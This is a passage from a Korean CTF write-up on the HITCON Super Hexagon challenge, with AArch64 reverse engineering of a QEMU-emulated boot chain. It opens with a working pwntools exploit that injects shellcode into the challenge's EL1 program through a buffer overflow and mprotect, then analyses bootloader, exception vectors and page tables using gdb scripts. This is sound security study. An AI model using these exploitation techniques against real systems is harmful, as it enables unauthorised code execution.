assert b'\r' not in payload and b'\x0a' not in payload
sla(b'cmd> ', b'1')
sla(b'index: ', str(0)) # sz
sla(b'key: ', payload)
p.interactive()
```
EL1도 exploit 하려면 안정적으로 쉘코드를 실행시킬 수 있어야한다.
  
```C
(*cmdtb[cmd])(buf,idx,len);
```
len, idx가 컨트롤 가능하기 때문에 mprotect를 호출해서 권한을 변경할 수 있다.
```C
> python3 ex.py
[+] Opening connection to localhost on port 6666: Done
[*] '/mnt/c/Users/msh/Desktop/SuperHexagon/super_hexagon-2044407c141e2a3a49d9fb57b62c73ee/release/super_hexagon/share/_bios.bin.extracted/BC010'
    Arch:     aarch64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
/mnt/c/Users/msh/Desktop/SuperHexagon/super_hexagon-2044407c141e2a3a49d9fb57b62c73ee/release/super_hexagon/ex.py:2: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  sla = lambda x,y : p.sendlineafter(x,y)
[*] Paused (press any to continue)
[*] Switching to interactive mode
ERROR:   [VMM] RWX pages are not allowed
[*] Got EOF while reading in interactive
$ 
[*] Closed connection to localhost port 6666
```
mprotect를 호출해서 rwx로 권한을 변경하려고 시도했지만 EL2가 rwx 페이지를 막는다.
그렇다면 처음 입력때 미리 쉘코드를 삽입하고 r-x 로 권한을 변경하고 거기로 점프하면 된다.
## Exploit code (code execution)
```Python
from pwn import *
from keystone import *
sla = lambda x,y : p.sendlineafter(x,y)
sa = lambda x,y : p.sendafter(x,y)
context.binary = e = ELF('./super_hexagon/share/_bios.bin.extracted/BC010')
ks = Ks(KS_ARCH_ARM64,KS_MODE_LITTLE_ENDIAN)

sc_st = 0x7ffeffffd006
shellcode = b''
shellcode += bytes(ks.asm(f'''\
    mov x5, #-1
    mov w4, #0x0
    mov w3, #0x0
    mov w2, #3
    mov x1, #0x1000
    mov x0, #0x0
    mov x8, #0xde
    svc #0x1337
    mov x11, x0
    mov w9, #0x0
    loop:                   
        add x1, x11, x9
        mov x8, #0x3f
        mov x0, #0
        mov x2, #0x1
        svc #0x1337
        add w9, w9, #1
        cmp x9, #0x1000
        bne loop
    mov x0, x11
    mov x1, #0x1000
    mov x2, #5
    mov x8, #0xe2
    svc #0x1337
    blr x11
''')[0])
assert b'\r' not in shellcode and b'\x0a' not in shellcode
p = remote('localhost',6666)
payload = b'A' * 0x100
payload += p64(0xdeadbeef) 
payload += p64(e.sym.gets) # cmd = 1
sla(b'cmd> ', b'1')
sla(b'index: ', str(0))
sla(b'key: ', payload)
sleep(0.1)
payload = b'A' * 0b101 + b'\x00'
payload += shellcode
p.sendline(payload)
sla(b'cmd> ', b'1')
sla(b'index: ', str(0x1000))
payload = b''
payload += b'A'*0b101 + b'\x00'
payload += b'A'*(0x100 - len(payload))
payload += p64(0xdeadbeef)
payload += p64(e.sym.mprotect)
payload += p64(sc_st)
sla(b'key: ', payload)
sla(b'cmd> ',b'2')
pause()
sla(b'index: ', str(1))
sleep(0.1)
stack_x29_x30 = 0xffffffffc0019bb0
addr = stack_x29_x30+0x10
shellcode = f'''\
    movz x1, #{((addr)>>48)&0xffff}, lsl #48
    movk x1, #{((addr)>>32)&0xffff}, lsl #32
    movk x1, #{((addr)>>16)&0xffff}, lsl #16
    movk x1, #{(addr)&0xffff}, lsl #0
    mov x0, #0
    mov x2, #0x100
    mov x8, #0x3f
    svc #0x1337
'''
pause()
payload = bytes(ks.asm(shellcode)[0])
payload += b'\x41' * (0x1000 - len(payload))
p.send(payload)
# 0x7ffeffffd01e 
p.interactive()
```
안정적으로 쉘코드를 삽입할 수 있다.
여기 커널에선 read가 1바이트씩 읽는 것으로 구현되므로 직접 1바이트씩 읽어서 저정하도록 만들어야한다.
# Reverse engineering BL1
BL1은 flash rom 위에서 돌면서 코드 무결성을 보장한다.
qemu의 hitcon 머신은 처음에 간단한 초기화를 진행하고 바로 부팅을 시작한다.
arm_load_kernel 코드를 직접 확인해보면, cpu는 처음에 reset을 수행하게 된다.
```C
 		hwaddr flashsize = memmap[VIRT_FLASH].size / 2;
    hwaddr flashbase = memmap[VIRT_FLASH].base;
    create_one_flash("hitcon.flash0", flashbase, flashsize, bios_name, secure_sysmem);
    create_one_flash("hitcon.flash1", flashbase + flashsize, flashsize, NULL, sysmem);
```
여기서 memmap[VIRT_FLASH].base는 0이고 bios.bin을 여기에 로드한다.
```C
static void hitcon_init(MachineState *machine)
{
 ...
 // prepare boot info
    bootinfo.ram_size = machine->ram_size;
    bootinfo.nb_cpus = 1;
    bootinfo.board_id = -1;
    bootinfo.firmware_loaded = true;
    bootinfo.loader_start = memmap[VIRT_MEM].base;
    bootinfo.kernel_filename = machine->kernel_filename;
    bootinfo.kernel_cmdline = machine->kernel_cmdline;
    bootinfo.initrd_filename = machine->initrd_filename;
    bootinfo.skip_dtb_autoload = true;
    arm_load_kernel(ARM_CPU(first_cpu), &bootinfo);
}
void arm_load_kernel(ARMCPU *cpu, MachineState *ms, struct arm_boot_info *info)
{
    CPUState *cs;
    AddressSpace *as = arm_boot_address_space(cpu, info);
    int boot_el;
    CPUARMState *env = &cpu->env;
    int nb_cpus = 0;
    /*
     * CPU objects (unlike devices) are not automatically reset on system
     * reset, so we must always register a handler to do so. If we're
     * actually loading a kernel, the handler is also responsible for
     * arranging that we start it correctly.
     */
    for (cs = first_cpu; cs; cs = CPU_NEXT(cs)) {
        qemu_register_reset(do_cpu_reset, ARM_CPU(cs));
        nb_cpus++;
    }
    /*
     * The board code is not supposed to set secure_board_setup unless
     * running its code in secure mode is actually possible, and KVM
     * doesn't support secure.
     */
    assert(!(info->secure_board_setup && kvm_enabled()));
    info->kernel_filename = ms->kernel_filename;
    info->kernel_cmdline = ms->kernel_cmdline;
    info->initrd_filename = ms->initrd_filename;
    info->dtb_filename = ms->dtb;
    info->dtb_limit = 0;
    /* Load the kernel.  */
    if (!info->kernel_filename || info->firmware_loaded) {
        arm_setup_firmware_boot(cpu, info);
    } else {
        arm_setup_direct_kernel_boot(cpu, info);
    }
  ...
  }
```
reset시에 호출될 do_reset 함수를 콜백으로 등록하고, rom의 0x0부터 실행을 시작한다.
IROM 내부에서 돌아가는 BL0를 에뮬레이션된 부분이라고 생각하면 된다.
  
이제 실질적인 부트로더 BL1을 분석한다.
0x0 번지부터 의사코드를 확인해보면 다음과 같다.
```Python
void Reset(void)
{
  ulong uVar1;
  
  sctlr_el3 = 0x30c50830;
  InstructionSynchronizationBarrier();
  vbar_el3 = 0x2000;
  InstructionSynchronizationBarrier();
  uVar1 = sctlr_el3;
  sctlr_el3 = uVar1 | 0x100a;
  InstructionSynchronizationBarrier();
  scr_el3 = 0x238;
  mdcr_el3 = 0x18000;
  uVar1 = daif;
  daif = uVar1 & 0xfffffffffffffeff;
  cptr_el3 = 0;
  FUN_00001004(DAT_000000b8,DAT_000000c0);
  FUN_000010f4(DAT_000000c8,PTR_DAT_000000d0,DAT_000000d8);
  FUN_000010f4(DAT_000000e0,PTR_LAB_000000e8,PTR_LAB_000000e8);
  FUN_000010f4(DAT_000000f0,PTR_DAT_000000f8,PTR_DAT_00000100);
  FUN_000010f4(DAT_00000108,PTR_LAB_00000110,PTR_LAB_000000e8);
  spsel = 0;
  FUN_00000514();
  FUN_000007f4();
  FUN_00000fa8();
  return;
}
```
위처럼 sctlr_el3 같은 레지스터에 접근하는 것을 볼 수 있다.
시스템 레지스터 뒤에 붙은 접미사는 최소 접근 권한을 뜻한다.
## CPSR structure & gdbscript
![](attachment/4e3c2094116dea72ad3cb4822b6b362b.png)
처음에 부팅하고 CPSR 레지스터를 확인하면 현재의 Exception level을 알 수 있다.
위는 CPSR의 구조이다.
이를 참고하여 cpsr을 확인하는 커맨드를 추가하는 gdbscript를 작성했다.
각각의 ELx에 대해서 SP_EL0와 SP_Elx 두 가지 옵션의 전환이 지원된다.
이를 파싱하는 스크립트를 작성했다.
```Python
import gdb
class CPSR(gdb.Command):
    def __init__(self):
        super(CPSR, self).__init__("cpsr", gdb.COMMAND_USER)
    def invoke(self, arg, from_tty):
        cpsr = (int(gdb.parse_and_eval("$cpsr")))
        mode = cpsr & 0b1111
        is_thumb = (cpsr >> 4)&1
        IRQ = (cpsr >> 7)&1
        FIQ = (cpsr >> 6)&1
        cond = (cpsr >> 27)&0b1111
        re = ''
        if 0b0000 == mode:
            re += 'EL0t' # SP_EL0
        elif 0b0100 == mode:
            re += 'EL1t' # SP_EL0
        elif 0b0101 == mode:
            re += 'EL1h' # SP_EL1
        elif 0b1000 == mode:
            re += 'EL2t' # SP_EL0
        elif 0b1001 == mode:
            re += 'EL2h' # SP_EL2
        elif 0b1100 == mode:
            re += 'EL3t' # SP_EL0
        elif 0b1101 == mode:
            re += 'EL3h' # SP_EL3
        else:
            re += 'UNK'
        re += '| '
        if IRQ:
            re += 'IRQ_MASKED | '
        elif FIQ:
            re += 'FIQ_MASKED | '
        if is_thumb:
            re += 'THUMB_MODE | '
        re += f'COND_{hex(cond)[2:]}'
        print(re)
CPSR()
```
  
gdb에 로드하고 0x0 번지부터 cpsr의 값을 확인해보면 다음과 같다.
```Python
gef> cpsr
EL3h| FIQ_MASKED | COND_8
```
초기 부팅시에 코드는 EL3 코드라는 것을 알 수 있다.
## SCTLR_ELx structure
![](attachment/614c0e573a0fe490fca6d99bab45f918.png)
초기에 EL3로 부팅을 시작하고, 이때 virtual memory system이 활성화 되었는지 확인해야한다.
M bit를 확인하면 된다.
![](attachment/f28a62576fc1c8773612ae36b684f334.png)
앞서 arm manual을 정리하면서 관련 내용을 다뤘다.
arm 프로세서는 power up시에 cold reset이 수행된다.
여기선 warm reset시 M bit가 0으로 세팅된다고 하지만, 앞서 정리한 메뉴얼에선 warm reset에서 reset되는 필드는 모두 cold reset에서도 reset된다고 설명했었다.
그렇기에 SCTLR_EL3.M bit는 0으로 IMPLEMENTATION DEFINED 값이다.
![](attachment/db5e56cda131c84f583ddbb15fa986ae.png)
실제로도 0으로 세팅되어있는 것을 볼 수 있다.
0x0 번지부터 실행될 때에는 당연하지만 가상 주소가 꺼져있음을 알 수 있다.
## Identifying exception handlers
### VBAR_ELx structure
![](attachment/4da5ac19604f5758778b401642aae59b.png)
exception이 일어나면 exception vector에 등록된 handler가 호출된다.
### Exception vector structure
![](attachment/46a3de22d67a2d11bc915aad8668153d.png)
0x80 align 되어있다.
```C
        00000010 80  ff  00  10    adr        x0,0x2000
        00000014 00  c0  1e  d5    msr        vbar_el3 ,x0
        00000018 df  3f  03  d5    isb
```
이제 exception vector가 어떻게 생겼는지 알고 있다.
```C
+#define RAMLIMIT_GB 3
+#define RAMLIMIT_BYTES (RAMLIMIT_GB * 1024ULL * 1024 * 1024)
+static const MemMapEntry memmap[] = {
+    /* Space up to 0x8000000 is reserved for a boot ROM */
+    [VIRT_FLASH] =              {          0, 0x08000000 },
+    [VIRT_CPUPERIPHS] =         { 0x08000000, 0x00020000 },
+    [VIRT_UART] =               { 0x09000000, 0x00001000 },
+    [VIRT_SECURE_MEM] =         { 0x0e000000, 0x01000000 },
+    [VIRT_MEM] =                { 0x40000000, RAMLIMIT_BYTES },
+};
```
앞서 물리 메모리 레이아웃을 patch 파일을 통해 식별했다.
VIRT_FLASH 부터 적재되었고, phyiscal address를 쓰니 0x2000 그대로 상수값대로 접근하면 될 것이다.
```C
                             LAB_00002000                                    XREF[1]:     FUN_000b8244:000b8344 (*)   
        00002000 00  00  80  d2    mov        x0,#0x0
        00002004 79  fb  ff  97    bl         FUN_00000de8                                     undefined FUN_00000de8()
        00002008 76  fb  ff  97    bl         FUN_00000de0                                     undefined FUN_00000de0()
        0000200c 00  00  00  00    udf        0x0
        00002010 00  00  00       db[112]
                 00  00  00 
                 00  00  00 
        00002080 20  00  80  d2    mov        x0,#0x1
        00002084 59  fb  ff  97    bl         FUN_00000de8                                     undefined FUN_00000de8()
        00002088 56  fb  ff  97    bl         FUN_00000de0                                     undefined FUN_00000de0()
        0000208c 00  00  00  00    udf        0x0
        00002090 00  00  00       ??[112]
                 00  00  00 
                 00  00  00 
        00002100 40  00  80  d2    mov        x0,#0x2
        00002104 39  fb  ff  97    bl         FUN_00000de8                                     undefined FUN_00000de8()
        00002108 36  fb  ff  97    bl         FUN_00000de0                                     undefined FUN_00000de0()
        0000210c 00  00  00  00    udf        0x0
        00002110 00  00  00       ??[112]
                 00  00  00 
                 00  00  00 
        00002180 60  00  80  d2    mov        x0,#0x3
        00002184 19  fb  ff  97    bl         FUN_00000de8                                     undefined FUN_00000de8()
        00002188 16  fb  ff  97    bl         FUN_00000de0                                     undefined FUN_00000de0()
        0000218c 00  00  00  00    udf        0x0
        00002190 00  00  00       ??[112]
                 00  00  00 
                 00  00  00 
        00002200 80  00  80  d2    mov        x0,#0x4
        00002204 f9  fa  ff  97    bl         FUN_00000de8                                     undefined FUN_00000de8()
        00002208 f6  fa  ff  97    bl         FUN_00000de0                                     undefined FUN_00000de0()
        0000220c 00  00  00  00    udf        0x0
        00002210 00  00  00       ??[112]
                 00  00  00 
                 00  00  00 
        00002280 a0  00  80  d2    mov        x0,#0x5
        00002284 d9  fa  ff  97    bl         FUN_00000de8                                     undefined FUN_00000de8()
        00002288 d6  fa  ff  97    bl         FUN_00000de0                                     undefined FUN_00000de0()
        0000228c 00  00  00  00    udf        0x0
        00002290 00  00  00       ??[112]
                 00  00  00 
                 00  00  00 
        00002300 c0  00  80  d2    mov        x0,#0x6
        00002304 b9  fa  ff  97    bl         FUN_00000de8                                     undefined FUN_00000de8()
        00002308 b6  fa  ff  97    bl         FUN_00000de0                                     undefined FUN_00000de0()
        0000230c 00  00  00  00    udf        0x0
        00002310 00  00  00       ??[112]
                 00  00  00 
                 00  00  00 
        00002380 e0  00  80  d2    mov        x0,#0x7
        00002384 99  fa  ff  97    bl         FUN_00000de8                                     undefined FUN_00000de8()
        00002388 96  fa  ff  97    bl         FUN_00000de0                                     undefined FUN_00000de0()
        0000238c 00  00  00  00    udf        0x0
        00002390 00  00  00       ??[112]
                 00  00  00 
                 00  00  00 
        00002400 ff  44  03  d5    msr        DAIFClr,#0x4
        00002404 fe  7b  00  f9    str        x30 ,[sp, #0xf0 ]
        00002408 1e  52  3e  d5    mrs        x30 ,esr_el3
        0000240c de  7f  5a  d3    ubfx       x30 ,x30 ,#0x1a ,#0x6
        00002410 df  5f  00  f1    cmp        x30 ,#0x17
        00002414 61  1f  00  54    b.ne       LAB_00002800
        00002418 fd  00  00  14    b          LAB_0000280c
        0000241c 00  00  00       ??[100]
                 00  00  00 
                 00  00  00 
        00002480 20  01  80  d2    mov        x0,#0x9
        00002484 59  fa  ff  97    bl         FUN_00000de8                                     undefined FUN_00000de8()
        00002488 56  fa  ff  97    bl         FUN_00000de0                                     undefined FUN_00000de0()
        0000248c 00  00  00  00    udf        0x0
        00002490 00  00  00       ??[112]
                 00  00  00 
                 00  00  00 
        00002500 40  01  80  d2    mov        x0,#0xa
        00002504 39  fa  ff  97    bl         FUN_00000de8                                     undefined FUN_00000de8()
        00002508 36  fa  ff  97    bl         FUN_00000de0                                     undefined FUN_00000de0()
        0000250c 00  00  00  00    udf        0x0
        00002510 00  00  00       ??[112]
                 00  00  00 
                 00  00  00 
        00002580 60  01  80  d2    mov        x0,#0xb
        00002584 19  fa  ff  97    bl         FUN_00000de8                                     undefined FUN_00000de8()
        00002588 16  fa  ff  97    bl         FUN_00000de0                                     undefined FUN_00000de0()
        0000258c 00  00  00  00    udf        0x0
        00002590 00  00  00       ??[112]
                 00  00  00 
                 00  00  00 
        00002600 ff  44  03  d5    msr        DAIFClr,#0x4
        00002604 fe  7b  00  f9    str        x30 ,[sp, #0xf0 ]
        00002608 1e  52  3e  d5    mrs        x30 ,esr_el3
        0000260c de  7f  5a  d3    ubfx       x30 ,x30 ,#0x1a ,#0x6
        00002610 df  4f  00  f1    cmp        x30 ,#0x13
        00002614 61  0f  00  54    b.ne       LAB_00002800
        00002618 7d  00  00  14    b          LAB_0000280c
                             ARRAY_0000261c[52]                              XREF[0,2]:   000bc070 (*) , 000bc078 (*)   
        0000261c 00  00  00       ??[100]
                 00  00  00 
                 00  00  00 
        00002680 a0  01  80  d2    mov        x0,#0xd
        00002684 d9  f9  ff  97    bl         FUN_00000de8                                     undefined FUN_00000de8()
        00002688 d6  f9  ff  97    bl         FUN_00000de0                                     undefined FUN_00000de0()
        0000268c 00  00  00  00    udf        0x0
        00002690 00  00  00       ??[112]
                 00  00  00 
                 00  00  00 
        00002700 c0  01  80  d2    mov        x0,#0xe
        00002704 b9  f9  ff  97    bl         FUN_00000de8                                     undefined FUN_00000de8()
        00002708 b6  f9  ff  97    bl         FUN_00000de0                                     undefined FUN_00000de0()
        0000270c 00  00  00  00    udf        0x0
        00002710 00  00  00       ??[112]
                 00  00  00 
                 00  00  00 
        00002780 e0  01  80  d2    mov        x0,#0xf
        00002784 99  f9  ff  97    bl         FUN_00000de8                                     undefined FUN_00000de8()
        00002788 96  f9  ff  97    bl         FUN_00000de0                                     undefined FUN_00000de0()
        0000278c 00  00  00  00    udf        0x0
        00002790 00  00  00       ??[112]
                 00  00  00 
                 00  00  00 
                             LAB_00002800                                    XREF[2]:     00002414 (j) , 00002614 (j)   
        00002800 00  01  80  d2    mov        x0,#0x8
        00002804 79  f9  ff  97    bl         FUN_00000de8                                     undefined FUN_00000de8()
        00002808 76  f9  ff  97    bl         FUN_00000de0                                     undefined FUN_00000de0()
                             LAB_0000280c                                    XREF[2]:     00002418 (j) , 00002618 (j)   
        0000280c c0  f9  ff  97    bl         FUN_00000f0c                                     undefined FUN_00000f0c(undefined
        00002810 e5  03  1f  aa    mov        x5,xzr
        00002814 e6  03  00  91    mov        x6,sp
        00002818 cc  88  40  f9    ldr        x12 ,[x6, #0x110 ]
        0000281c bf  40  00  d5    msr        PState.SP,#0x0
        00002820 9f  01  00  91    mov        sp,x12
        00002824 10  40  3e  d5    mrs        x16 ,spsr_el3
        00002828 31  40  3e  d5    mrs        x17 ,elr_el3
        0000282c 12  11  3e  d5    mrs        x18 ,scr_el3
        00002830 d0  c4  11  a9    stp        x16 ,x17 ,[x6, #0x118 ]
        00002834 d2  80  00  f9    str        x18 ,[x6, #0x100 ]
        00002838 47  02  40  b3    bfxil      x7,x18 ,#0x0 ,#0x1
        0000283c 06  f8  ff  97    bl         FUN_00000854                                     undefined FUN_00000854()
        00002840 da  f9  ff  17    b          FUN_00000fa8                                     undefined FUN_00000fa8(undefined
                             -- Flow Override: CALL_RETURN (CALL_TERMINATOR)
                             ARRAY_00002844[12]                              XREF[3,2]:   FUN_0000055c:00000578 (*) , 
                             ARRAY_00002844                                               FUN_0000055c:00000654 (*) , 
                                                                                          00001950 (*) , Reset:00000060 (*) , 
                                                                                          000000d0 (*)   
        00002844 00  00  00       ??[112]
                 00  00  00 
                 00  00  00 
```
ghidra를 통해 적당히 0x80씩 더해가며 디스어셈블해보니 exception handler를 식별할 수 있었다.
대충 어떤식으로 분석을 시도해야하는지 알게 되었다.
  
그런데 지금 취약점을 찾아서 익스플로잇해야하는 부분은 EL3가 아닌 EL1이다.
일단 EL3의 exception vector를 찾았으니 나중을 위해 남겨두고 다시 부트로더를 분석해야한다.
```C
void Reset(void)
{
  ulong uVar1;
  
  sctlr_el3 = 0x30c50830;
  InstructionSynchronizationBarrier();
  vbar_el3 = 0x2000;
  InstructionSynchronizationBarrier();
  uVar1 = sctlr_el3;
  sctlr_el3 = uVar1 | 0x100a;
  InstructionSynchronizationBarrier();
  scr_el3 = 0x238;
  mdcr_el3 = 0x18000;
  uVar1 = daif;
  daif = uVar1 & 0xfffffffffffffeff;
  cptr_el3 = 0;
  FUN_00001004(DAT_000000b8,DAT_000000c0);
  FUN_000010f4(DAT_000000c8,PTR_DAT_000000d0,DAT_000000d8);
  FUN_000010f4(DAT_000000e0,PTR_LAB_000000e8,PTR_LAB_000000e8);
  FUN_000010f4(DAT_000000f0,PTR_DAT_000000f8,PTR_DAT_00000100);
  FUN_000010f4(DAT_00000108,PTR_LAB_00000110,PTR_LAB_000000e8);
  spsel = 0;
  FUN_00000514();
  FUN_000007f4();
  FUN_00000fa8();
  return;
}
```
대강 어떤 동작을 하고 있는지 이제 이해할 수 있다.
```C
void FUN_00001004(char *param_1,char *param_2)
{
  undefined8 *puVar1;
  undefined8 *puVar2;
  undefined8 *puVar3;
  
  puVar2 = (undefined8 *)(param_1 + (long)param_2);
  if (((ulong)param_1 & 0xf) != 0) {
    puVar1 = (undefined8 *)(((ulong)param_1 | 0xf) + 1);
    if ((((ulong)param_1 | 0xf) == 0xffffffffffffffff) ||
       (puVar3 = (undefined8 *)param_1, puVar2 <= puVar1)) goto joined_r0x000010b4;
    do {
      param_1 = (char *)((long)puVar3 + 1);
      *(undefined *)puVar3 = 0;
      puVar3 = (undefined8 *)param_1;
    } while ((undefined8 *)param_1 != puVar1);
  }
  for (; param_1 < (undefined8 *)((ulong)puVar2 & 0xfffffffffffffff0);
      param_1 = (char *)((long)param_1 + 0x10)) {
    *(undefined8 *)param_1 = 0;
    *(undefined8 *)((long)param_1 + 8) = 0;
  }
joined_r0x000010b4:
  for (; (undefined8 *)param_1 != puVar2; param_1 = (char *)((long)param_1 + 1)) {
    *param_1 = 0;
  }
  return;
}
```
메모리를 0으로 초기화하는 작업을 수행한다.
```C
void FUN_000010f4(char *param_1,char *param_2,ulong size)
{
  undefined8 uVar1;
  
  for (; 0xf < size; size = size - 0x10) {
    uVar1 = *(undefined8 *)((long)param_2 + 8);
    *(undefined8 *)param_1 = *(undefined8 *)param_2;
    *(undefined8 *)((long)param_1 + 8) = uVar1;
    param_1 = (char *)((long)param_1 + 0x10);
    param_2 = (char *)((long)param_2 + 0x10);
  }
  do {
    if (size == 0) {
      return;
    }
    *param_1 = *param_2;
    size = size - 1;
    param_1 = (char *)((long)param_1 + 1);
    param_2 = (char *)((long)param_2 + 1);
  } while (size != 0);
  return;
}
```
두 번째는 단순히 복사하는 함수다.
  
정리하면 다음과 같이 표현할 수 있다.
```C
memset(0xE002000, 0, 0x202000)
memcpy(0xE000000, 0x002850, 0x68)
memcpy(0x40100000, 0x10000, 0x10000)
memcpy(0xE400000, 0x20000, 0x90000)
memcpy(0x40000000, 0xb0000, 0x10000)
```
EL3 코드는 코드 무결성을 위해 코드는 DRAM에 올라가지 않는다.
FLASH에서 동작한다.
  
0x10000를 확인했더니 다음과 같은 코드가 나왔다.
```C
                             *************************************************************
                             *                           FUNCTION                          
                             *************************************************************
                             undefined  FUN_00010000 ()
             undefined         w0:1           <RETURN>
                             FUN_00010000                                    XREF[4]:     Reset:00000070 (*) , 
                                                                                          Reset:00000074 (*) , 
                                                                                          Reset:00000094 (*) , 000bc080 (*)   
        00010000 00  c0  00  10    adr        x0,0x11800
        00010004 00  c0  1c  d5    msr        vbar_el2 ,x0
        00010008 df  3f  03  d5    isb
        0001000c 60  01  00  58    ldr        x0,DAT_00010038
        00010010 81  01  00  58    ldr        x1=>DAT_0000d000 ,PTR_DAT_00010040               = 0000d000
        00010014 13  02  00  94    bl         FUN_00010860                                     undefined FUN_00010860()
        00010018 bf  40  00  d5    msr        PState.SP,#0x0
        0001001c 60  01  00  58    ldr        x0,DAT_00010048                                  = 0000000040104040h
        00010020 1f  00  00  91    mov        sp,x0
        00010024 0b  00  00  94    bl         FUN_00010050                                     undefined FUN_00010050()
        00010028 e2  00  00  94    bl         FUN_000103b0                                     undefined FUN_000103b0()
        0001002c 65  00  00  94    bl         FUN_000101c0                                     undefined FUN_000101c0()
        00010030 fa  01  00  94    bl         FUN_00010818                                     undefined FUN_00010818(undefined
```
adr로 상대 주소를 만들어낸다.
이는 EL2의 코드이다.
![](attachment/a4f16a9ae4af921959d47901bad9ac91.png)
물리메모리 맵에 따라 적재된 이후 실행되었기 때문에 이러한 주소를 가지게 된다.
여기서 EL1의 exception vector 주소는 가상 주소로 설정되어있다.
  
0xb0000에서 EL1을 확인할 수 있었다.
```C
void UndefinedFunction_000b0000(void)
{
  ulong uVar1;
  
  ttbr0_el1 = 0xb1000;
  ttbr1_el1 = 0xb4000;
  tcr_el1 = 0x6080100010;
  InstructionSynchronizationBarrier();
  uVar1 = sctlr_el1;
  sctlr_el1 = uVar1 | 1;
  InstructionSynchronizationBarrier();
                    /* WARNING: Treating indirect jump as call */
  (*(code *)&LAB_ffffffffc00b8000)();
  return;
}
```
이런식으로 virtual memory system을 활성화하고 점프한다.
EL1까지 찾았으니 소거법으로 마지막 남은 0x20000은 S.EL1에 해당할 것이다.
BL1 부팅을 좀 더 확인해보면, EL3에서 eret으로 EL2로 내려가서 부팅을 마저 수행한다.
그리고 IPA 0x0부터 EL1을 마저 부팅하게 되며 이때 TEE OS를 초기화한다.
## Extracting EL1, S-EL1, EL2 binaries
```C
#!/bin/sh
dd if=./bios.bin of=EL1.out bs=1024 skip=704 count=64
dd if=./bios.bin of=SEL1.out bs=1024 skip=128 count=576
dd if=./bios.bin of=EL2.out bs=1024 skip=64 count=64
```
이제 EL1을 분석할 수 있게 되었다.
```C
void Reset(void)
{
  ulong uVar1;
  
  ttbr0_el1 = 0x1000;
  ttbr1_el1 = 0x4000;
  tcr_el1 = 0x6080100010;
  InstructionSynchronizationBarrier();
  uVar1 = sctlr_el1;
  sctlr_el1 = uVar1 | 1;
  InstructionSynchronizationBarrier();
                    /* WARNING: Treating indirect jump as call */
  (*(code *)&LAB_ffffffffc0008000)();
  return;
}
```
여러 시스템 레지스터를 세팅하는 것을 확인할 수 있다.
```C
                             QWORD_00001000                                  XREF[4]:     FUN_00008434:0000846c (*) , 
                                                                                          FUN_0000c140:0000c1c4 (*) , 
                                                                                          FUN_0000c140:0000c1d4 (*) , 
                                                                                          FUN_0000c5dc:0000c630 (*)   
        00001000 03  20  00       dq         2003h
                 00  00  00 
                 00  00
```
0x1000에는 위와 같은 값이 있다.
## TCR_ELx structure & gdbscript
전에 정리했었던 arm manual에서 두 개의 VA ranges를 지원하기 위해 TTBR0, TTBR1를 이용한다고 했었다.
그리고 이 두 개의 VA ranges에 대해서 각자에 TCR의 TxSz로 범위가 지정된다고 했었다.
![](attachment/bb5055b4d20e580c83b83e57fbb7d002.png)
![](attachment/cfc87d22c954e4102f1332aad0750d3d.png)
이를 기반으로 gdbscript로 파싱하는 스크립트를 작성해서 명령을 추가했다.
```Python
import gdb
class TCR_EL1(gdb.Command):
    def __init__(self):
        super(TCR_EL1, self).__init__("tcr_el1", gdb.COMMAND_USER)
    def invoke(self, arg, from_tty):
        arg = arg.split()
        if len(arg) == 1:
            tcr = int(arg[0],16)
        elif len(arg) == 0:
            tcr = int(gdb.parse_and_eval('$TCR_EL1'))
        else:
            print("usuage: tcr_el1 [value (optional)]")
            return
        T0SZ = tcr &0b111111
        T1SZ = tcr >> 16
        T1SZ &= 0b111111
        TG1 = int((tcr>> 30) & 0b11)
        granule_bits = {0b01: 14, 0b10: 12, 0b11: 16}[TG1]
        print("T0:",hex(0),'~',hex(2 ** (64-T0SZ)-1))
        print("T1:",hex(0x10000000000000000 - 2 ** (64-T1SZ)),'~',hex(0xffffffffffffffff))
        print('granule_bits:',granule_bits)
TCR_EL1()
```
![](attachment/a7c88574f81744bc340e00c2ba22572b.png)
이러한 범위로 이용되는 것을 확인했다.
  
TTBR이 가리키고 있는 물리 메모리 영역을 읽어야한다.
qemu에선 gdb-stub을 제공해줘서 monitor 명령어를 이용해서 물리 메모리를 읽을 수 있다.
```Python
address-space: memory
  0000000000000000-ffffffffffffffff (prio -1, i/o): system
    0000000004000000-0000000007ffffff (prio 0, romd): hitcon.flash1
    0000000009000000-0000000009000fff (prio 0, i/o): pl011
    0000000040000000-00000000ffffffff (prio 0, ram): mach-hitcon.ram
address-space: I/O
  0000000000000000-000000000000ffff (prio 0, i/o): io
address-space: cpu-secure-memory-0
  0000000000000000-ffffffffffffffff (prio 0, i/o): secure-memory
    0000000000000000-0000000003ffffff (prio 0, romd): hitcon.flash0
    0000000000000000-ffffffffffffffff (prio -1, i/o): system
      0000000004000000-0000000007ffffff (prio 0, romd): hitcon.flash1
      0000000009000000-0000000009000fff (prio 0, i/o): pl011
      0000000040000000-00000000ffffffff (prio 0, ram): mach-hitcon.ram
    000000000e000000-000000000effffff (prio 0, ram): hitcon.secure-ram
address-space: cpu-memory-0
  0000000000000000-ffffffffffffffff (prio -1, i/o): system
    0000000004000000-0000000007ffffff (prio 0, romd): hitcon.flash1
    0000000009000000-0000000009000fff (prio 0, i/o): pl011
    0000000040000000-00000000ffffffff (prio 0, ram): mach-hitcon.ram
```
그런데 메모리 region을 보면 cpu-memory-0를 제외하고는 모두 secure-memory-0의 subregion으로 존재한다.
## Reading a secure memory & gdbscript
각자의 EL에서 디버깅을 할텐데 해당 EL에선 더 상위 EL의 메모리를 읽기 힘들다.
gdbstub에서 xp라는 명령으로 물리메모리에 액세스가 가능해서 편하게 물리메모리 영역을 덤프할 수 있다.
근데 문제는 Secure world의 메모리는 전혀 읽지 못한다는 점이다.
이는 qemu가 secure world가 메모리 격리를 고려해서 NS 비트가 세팅되지 않았을때 secure world 메모리를 읽지 못하도록 구현한 것으로 보인다.
전체 Secure/Non-secure world의 모든 물리 메모리를 접근하고 덤프하는 툴이 있으면 분석하기 편할 것 같아서 만들기로 결정했다.

다른 오픈소스 프로젝트들을 참고해서 arm64의 secure memory에 대한 물리 메모리 읽기를 어떤 방식으로 구현했는지 확인했다.
이를 바탕으로 직접 gdbscript를 작성해서 물리 메모리를 확인할 수 있는 명령어 지원을 추가했다.
```Python
import gdb
import re
import psutil
import struct
class CPSR(gdb.Command):
    def __init__(self):
        super(CPSR, self).__init__("cpsr", gdb.COMMAND_USER)
    def invoke(self, arg, from_tty):
